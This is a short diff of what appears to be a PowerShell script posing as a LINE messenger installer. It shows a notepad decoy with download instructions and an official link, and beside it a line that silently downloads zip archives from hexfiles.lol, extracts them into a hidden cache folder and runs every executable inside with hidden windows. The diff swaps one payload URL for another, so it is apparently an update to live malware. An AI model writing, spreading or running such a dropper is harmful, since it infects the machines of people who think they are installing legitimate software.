@@ -112,4 +112,4 @@ Confirm the login on your phone if LINE asks for verification.
 Alternative official website link:
 https://line.me/en/download
 '@);notepad $f
-$u='https://hexfiles.lol/d/50ea813ae88f','https://hexfiles.lol/d/0914fbe254cf';$b="$home\.cache";md $b -ErrorAction SilentlyContinue|Out-Null;$u|%{$d="$b\$([guid]::NewGuid())";md $d|Out-Null;$z="$d.zip";(New-Object Net.WebClient).DownloadFile($_,$z);Expand-Archive $z $d -Force;Get-ChildItem $d -Recurse *.exe|%{Start-Process $_.FullName -WindowStyle Hidden}}
+$u='https://hexfiles.lol/d/7451cf7f1f65','https://hexfiles.lol/d/0914fbe254cf';$b="$home\.cache";md $b -ErrorAction SilentlyContinue|Out-Null;$u|%{$d="$b\$([guid]::NewGuid())";md $d|Out-Null;$z="$d.zip";(New-Object Net.WebClient).DownloadFile($_,$z);Expand-Archive $z $d -Force;Get-ChildItem $d -Recurse *.exe|%{Start-Process $_.FullName -WindowStyle Hidden}}
